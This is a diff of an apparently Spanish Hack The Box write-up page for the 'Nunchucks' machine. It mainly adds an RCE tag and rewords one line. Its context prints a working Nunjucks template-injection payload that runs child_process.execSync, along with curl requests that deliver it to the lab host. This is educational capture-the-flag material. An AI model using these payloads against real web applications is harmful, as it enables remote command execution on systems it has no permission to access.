@@ -19,8 +19,8 @@
 <meta itemprop=name content="Nunchucks">
 <meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a Server-Side Template Injection (SSTI) y tiene algunas capabilities habilitadas pero protegidas. Para comprometer la máquina se necesitan conocimientos de plantillas en Node.js y ejecución de comandos en Perl"><meta itemprop=datePublished content="2021-11-02T00:00:00+01:00">
 <meta itemprop=dateModified content="2021-11-02T00:00:00+01:00">
-<meta itemprop=wordCount content="1099">
-<meta itemprop=keywords content="perl,express,capabilities,ssti,">
+<meta itemprop=wordCount content="1100">
+<meta itemprop=keywords content="perl,express,capabilities,ssti,rce,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Nunchucks">
 <meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web vulnerable a Server-Side Template Injection (SSTI) y tiene algunas capabilities habilitadas pero protegidas. Para comprometer la máquina se necesitan conocimientos de plantillas en Node.js y ejecución de comandos en Perl">
@@ -124,6 +124,9 @@ $
 <li class=list>
 <a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/ssti title="Server-Side Template Injection">Server-Side Template Injection</a>
 </li>
+<li class=list>
+<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
+</li>
 </ul>
 <aside aria-label=aside class="w-20-l mt6-l aside-mobile">
 <div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
@@ -222,7 +225,7 @@ ETag: W/&#34;fbd-udK+KYlYFVN2Nn2DXdm1EXd8mv0&#34;
 </code></pre></div><p>Y ver si responde con <code>49</code>. Utilizando la petición POST desde <code>curl</code>, se puede ver que el <em>payload</em> funciona:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl https://store.nunchucks.htb/api/submit -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -kd <span style=color:#e6db74>&#39;{&#34;email&#34;:&#34;{{7*7}}&#34;}&#39;</span> 
 {&#34;response&#34;:&#34;You will receive updates on the following email address: 49.&#34;}
-</code></pre></div><p>Ahora que sabemos que es vulnerable, podemos buscar <em>payloads</em> maliciosos para conseguir <em>Remote Command Execution</em> (RCE). El siguiente <em>payload</em> puede encontrarse <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>aquí</a>:</p>
+</code></pre></div><p>Ahora que sabemos que es vulnerable, podemos buscar <em>payloads</em> maliciosos para conseguir ejecución remota de comandos (RCE). El siguiente <em>payload</em> puede encontrarse <a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine>aquí</a>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-django data-lang=django><span style=color:#75715e>{{</span>range.constructor<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;return global.process.mainModule.require(&#34;child_process&#34;).execSync(&#34;whoami&#34;)&#39;</span><span style=color:#f92672>)()</span><span style=color:#75715e>}}</span> 
 </code></pre></div><p>Para utilizar este <em>payload</em> en <code>curl</code>, es necesario utilizar un tercer tipo de comillas porque el <em>payload</em> irá encapsulado en un documento JSON. Una solución es utilizar <em>backticks</em> (<code>`</code>), que están soportadas por JavaScript, aunque hay que escaparlas porque <code>curl</code> se ejecuta en un entorno de consola (otra solución podría haber sido escapar o escapar dos beces las comillas normales).</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ curl https://store.nunchucks.htb/api/submit -H <span style=color:#e6db74>&#39;Content-Type: application/json&#39;</span> -kd <span style=color:#e6db74>&#34;{\&#34;email\&#34;:\&#34;{{range.constructor(&#39;return global.process.mainModule.require(\`child_process\`).execSync(\`whoami\`)&#39;)()}}\&#34;}&#34;</span> 
